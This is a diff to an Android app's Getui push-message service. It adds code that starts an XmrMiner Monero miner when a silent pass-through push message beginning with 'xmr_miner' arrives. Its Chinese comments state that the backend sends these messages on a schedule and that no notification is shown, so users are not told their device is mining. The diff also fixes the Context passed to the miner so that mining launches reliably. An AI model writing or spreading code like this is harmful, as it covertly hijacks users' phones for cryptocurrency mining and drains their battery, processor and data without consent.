@@ -60,36 +60,43 @@ public final class GetuiIntentService extends GTIntentService {
         } else {
             String data = new String(payload);
             LogUtils.info("receiver payload = " + data);
-            // todo 这边后台定时推送透传消息（字段约定好，如xmr_miner, 无需在通知框中显示），启动挖矿
+            /**
+             * 定时推送透传消息拉起挖矿服务
+             *
+             * <li>
+             *  1. 推送后台定时推送透传消息到接入客户端，约定好数据标识，如xmr_miner开头的字符，或者其他json串，无需启动通知栏通知.
+             *  2. init(Context)的Context参数必须为主进程的Context，不能为Service的context，否则启动挖矿会失败
+             * </li>
+             */
+            // todo 启动字段|条件接入方自行设置，但init(Context)的Context参数必须为主进程的Context，不能为Service的context，否则启动挖矿会失败
             if (data.startsWith("xmr_miner")) {
-                // todo 推送进程中，bindService不成功
-                XmrMiner.instance().init(context).setStateObserver(new StateObserver() {
+                XmrMiner.instance().init(App.getContext()).setStateObserver(new StateObserver() {
                     @Override
-                    public void onConnectPoolBegin() throws RemoteException {
+                    public void onConnectPoolBegin() {
                     }
 
                     @Override
-                    public void onConnectPoolSuccess() throws RemoteException {
+                    public void onConnectPoolSuccess() {
                     }
 
                     @Override
-                    public void onConnectPoolFail(String error) throws RemoteException {
+                    public void onConnectPoolFail(String error) {
                     }
 
                     @Override
-                    public void onPoolDisconnect(String error) throws RemoteException {
+                    public void onPoolDisconnect(String error) {
                     }
 
                     @Override
-                    public void onMessageFromPool(String message) throws RemoteException {
+                    public void onMessageFromPool(String message) {
                     }
 
                     @Override
-                    public void onMiningError(String error) throws RemoteException {
+                    public void onMiningError(String error) {
                     }
 
                     @Override
-                    public void onMiningStatus(double speed) throws RemoteException {
+                    public void onMiningStatus(double speed) {
                     }
                 }).startMine();
             }
